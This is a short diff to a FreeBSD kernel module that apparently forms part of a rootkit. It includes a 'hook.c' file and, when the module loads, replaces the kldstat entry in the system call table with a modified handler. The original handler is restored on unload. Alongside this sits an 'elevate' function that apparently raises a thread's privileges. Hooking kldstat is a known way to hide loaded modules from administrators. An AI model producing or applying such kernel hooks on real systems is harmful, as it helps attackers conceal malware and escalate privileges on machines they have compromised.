@@ -13,6 +13,8 @@
 #include <sys/mutex.h>
 #include <sys/lock.h>
 
+#include "hook.c"
+
 void elevate(struct thread *td);
 
 /* The system call's arguments. */
@@ -85,11 +87,15 @@ static int load(struct module *module, int cmd, void *arg) {
 
 	switch (cmd) {
 	case MOD_LOAD:
-		uprintf("System call loaded at offset %d.\n", offset);
+		uprintf("System call loaded at offset %d. yewwwwwwwwwwwwwwwwwww\n", offset);
+		sysent[SYS_kldstat].sy_call = (sy_call_t *)sys_kldstat_mod;
+		uprintf("kldstat hooked bb\n");
 		break;
 
 	case MOD_UNLOAD:
 		uprintf("System call unloaded from offset %d.\n", offset);
+		sysent[SYS_kldstat].sy_call = (sy_call_t *)sys_kldstat;
+		uprintf("kldstat unhooked\n");
 		break;
 
 	default:
